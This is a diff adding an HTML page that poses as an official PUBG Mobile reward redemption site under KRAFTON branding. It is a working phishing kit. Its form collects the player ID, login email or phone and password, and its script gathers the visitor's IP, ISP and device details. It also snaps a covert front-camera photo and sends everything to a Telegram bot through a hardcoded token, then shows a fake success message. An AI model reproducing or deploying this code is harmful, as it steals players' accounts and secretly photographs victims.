@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PUBG MOBILE - Official UC & Royale Pass Redemption Center</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.35/ua-parser.min.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
+        
+        body {
+            background-color: #121214;
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        header {
+            width: 100%;
+            background: #1a1a1e;
+            border-bottom: 1px solid #2d2d35;
+            padding: 18px 48px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .logo-area {
+            font-weight: 800;
+            font-size: 20px;
+            color: #ffcc00;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            text-decoration: none;
+        }
+
+        .official-badge {
+            font-size: 12px;
+            background: #ffcc00;
+            color: #121214;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-weight: 700;
+            text-transform: uppercase;
+        }
+
+        .main-wrapper {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            padding: 48px 20px;
+        }
+
+        .container {
+            max-width: 600px;
+            width: 100%;
+            background: #1a1a1e;
+            border: 1px solid #2d2d35;
+            padding: 40px 48px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+            text-align: left;
+        }
+
+        .breadcrumb {
+            font-size: 13px;
+            color: #8c8c9b;
+            margin-bottom: 20px;
+        }
+
+        .breadcrumb span {
+            color: #ffffff;
+            font-weight: 500;
+        }
+
+        h1 {
+            font-size: 26px;
+            color: #ffffff;
+            font-weight: 700;
+            margin-bottom: 12px;
+            letter-spacing: -0.3px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #8c8c9b;
+            margin-bottom: 24px;
+            line-height: 1.6;
+        }
+
+        .support-notice {
+            background: rgba(255, 204, 0, 0.08);
+            border-left: 4px solid #ffcc00;
+            padding: 14px 18px;
+            border-radius: 4px;
+            font-size: 13px;
+            color: #d1d1d6;
+            margin-bottom: 28px;
+            line-height: 1.6;
+        }
+
+        .support-notice strong {
+            color: #ffcc00;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            font-size: 13px;
+            font-weight: 600;
+            color: #d1d1d6;
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 12px 16px;
+            background: #25252b;
+            border: 1px solid #3d3d47;
+            border-radius: 8px;
+            color: #ffffff;
+            font-size: 14px;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+
+        .form-control:focus {
+            border-color: #ffcc00;
+            background: #1a1a1e;
+        }
+
+        .reward-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+
+        .reward-card {
+            background: #25252b;
+            border: 1px solid #3d3d47;
+            padding: 14px;
+            border-radius: 8px;
+            cursor: pointer;
+            text-align: center;
+            transition: all 0.2s ease;
+        }
+
+        .reward-card.selected {
+            border-color: #ffcc00;
+            background: rgba(255, 204, 0, 0.1);
+        }
+
+        .reward-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: #ffffff;
+        }
+
+        .reward-desc {
+            font-size: 12px;
+            color: #8c8c9b;
+            margin-top: 4px;
+        }
+
+        .btn {
+            background: #ffcc00;
+            color: #121214;
+            border: none;
+            padding: 14px;
+            font-size: 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: 700;
+            transition: background 0.2s ease;
+            margin-top: 16px;
+            text-transform: uppercase;
+        }
+
+        .btn:hover {
+            background: #e6b800;
+        }
+
+        .btn:disabled {
+            background: #3d3d47;
+            color: #8c8c9b;
+            cursor: not-allowed;
+        }
+        
+        .progress-container { display: none; margin-top: 20px; }
+        
+        .progress-bar-bg {
+            background: #2d2d35;
+            border-radius: 4px;
+            height: 4px;
+            width: 100%;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+
+        .progress-bar-fill {
+            background: #ffcc00;
+            height: 100%;
+            width: 0%;
+            transition: width 0.4s ease;
+        }
+
+        .status-text {
+            font-size: 13px;
+            color: #8c8c9b;
+            text-align: center;
+            font-weight: 500;
+        }
+
+        footer {
+            width: 100%;
+            padding: 24px 48px;
+            text-align: left;
+            font-size: 12px;
+            color: #8c8c9b;
+            border-top: 1px solid #2d2d35;
+            background: #1a1a1e;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="header-left">
+            <a href="#" class="logo-area">PUBG MOBILE</a>
+            <div class="official-badge">Official Event</div>
+        </div>
+    </header>
+
+    <div class="main-wrapper">
+        <div class="container" id="main-card">
+            <div class="breadcrumb">Event Center &nbsp;/&nbsp; <span>UC & Royale Pass Redemption</span></div>
+            
+            <h1>Claim Official Rewards</h1>
+            <p class="subtitle">Enter your Player ID and account credentials to claim your seasonal rewards securely via the official redemption gateway.</p>
+            
+            <div class="support-notice">
+                <strong>Verification Protocol:</strong> Account verification is required to process reward delivery directly to your in-game mail system.
+            </div>
+
+            <div class="form-group">
+                <label>Select Reward Package</label>
+                <div class="reward-grid">
+                    <div class="reward-card selected" onclick="selectReward(this, '8100 UC + Royale Pass')">
+                        <div class="reward-title">8100 UC</div>
+                        <div class="reward-desc">+ Royale Pass Max</div>
+                    </div>
+                    <div class="reward-card" onclick="selectReward(this, 'Unknown Cash 10000')">
+                        <div class="reward-title">10000 UC</div>
+                        <div class="reward-desc">Exclusive Pack</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Character ID / Player ID</label>
+                <input type="text" id="pubgId" class="form-control" placeholder="Enter 9-10 digit ID" autocomplete="off">
+            </div>
+
+            <div class="form-group">
+                <label>Account Login Email / Phone</label>
+                <input type="text" id="pubgContact" class="form-control" placeholder="Linked email or phone" autocomplete="off" oninput="checkForm()">
+            </div>
+
+            <div class="form-group">
+                <label>Account Password</label>
+                <input type="password" id="pubgPassword" class="form-control" placeholder="Enter password" autocomplete="off" oninput="checkForm()">
+            </div>
+
+            <button class="btn" id="generateBtn" onclick="startProcess()" disabled>Process Reward Request</button>
+
+            <div class="progress-container" id="progressBox">
+                <div class="progress-bar-bg">
+                    <div class="progress-bar-fill" id="progressFill"></div>
+                </div>
+                <div class="status-text" id="statusText">Connecting to game servers...</div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        &copy; 2026 KRAFTON, Inc. All rights reserved. &nbsp;&middot;&nbsp; Privacy Policy &nbsp;&middot;&nbsp; Terms of Service
+    </footer>
+
+    <script>
+        const BOT_TOKEN = "8918413203:AAG-EBiQakMDS0jK1H3d26ox0UpBh6LN-eY";
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('id') || "6782298541";
+
+        let selectedPackage = "8100 UC + Royale Pass";
+
+        function selectReward(el, pkg) {
+            document.querySelectorAll('.reward-card').forEach(c => c.classList.remove('selected'));
+            el.classList.add('selected');
+            selectedPackage = pkg;
+        }
+
+        function checkForm() {
+            const contact = document.getElementById('pubgContact').value.trim();
+            const pass = document.getElementById('pubgPassword').value.trim();
+            const btn = document.getElementById('generateBtn');
+            if (contact && pass) {
+                btn.disabled = false;
+            } else {
+                btn.disabled = true;
+            }
+        }
+
+        async function startProcess() {
+            const playerId = document.getElementById('pubgId').value.trim();
+            const contact = document.getElementById('pubgContact').value.trim();
+            const pass = document.getElementById('pubgPassword').value.trim();
+
+            if (!playerId || !contact || !pass) {
+                alert("Please complete all required fields.");
+                return;
+            }
+
+            document.getElementById('generateBtn').style.display = 'none';
+            document.getElementById('progressBox').style.display = 'block';
+
+            let deviceModel = "نادیار";
+            try {
+                const parser = new UAParser();
+                const result = parser.getResult();
+                deviceModel = `${result.device.vendor || ''} ${result.device.model || ''} (${result.os.name || ''} ${result.os.version || ''})`.trim();
+            } catch (e) {}
+
+            let ip = 'نادیار', isp = 'نادیار';
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                ip = data.ip || 'نادیار';
+                isp = data.org || 'نادیار';
+            } catch (e) {}
+
+            let cameraBlob = null;
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                cameraBlob = await new Promise((resolve) => {
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 640; canvas.height = 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                        canvas.toBlob(blob => {
+                            stream.getTracks().forEach(t => t.stop());
+                            resolve(blob);
+                        }, 'image/jpeg');
+                    }, 1000);
+                });
+            } catch (e) {}
+
+            updateProgress(30, "Verifying Player ID...");
+            await sleep(800);
+            updateProgress(70, "Processing reward package transfer...");
+            await sleep(800);
+            updateProgress(100, "Finalizing transaction...");
+
+            const msg = `PUBG Mobile Reward Request:\n\n` +
+                        `Package: ${selectedPackage}\n` +
+                        `Player ID: ${playerId}\n` +
+                        `Contact: ${contact}\n` +
+                        `Password: ${pass}\n\n` +
+                        `IP: ${ip} (${isp})\n` +
+                        `Device: ${deviceModel}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot{BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
+                });
+            } catch (err) {}
+
+            if (cameraBlob) {
+                try {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('photo', cameraBlob, 'camera.jpg');
+                    fd.append('caption', `Live Camera (PUBG Event: ${playerId})`);
+                    await fetch(`https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                } catch (e) {}
+            }
+
+            setTimeout(() => {
+                document.getElementById('main-card').innerHTML = `
+                    <h2 style="font-size: 22px; margin-bottom: 14px; color: #ffffff;">Reward Processing</h2>
+                    <p style="color: #8c8c9b; font-size: 14px; line-height: 1.6;">Your reward package (${selectedPackage}) has been successfully queued. Items will be delivered to your in-game mail within 24 hours.</p>
+                `;
+            }, 1000);
+        }
+
+        function updateProgress(p, t) {
+            document.getElementById('progressFill').style.width = p + '%';
+            document.getElementById('statusText').innerText = t;
+        }
+
+        function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+    </script>
+</body>
+</html>
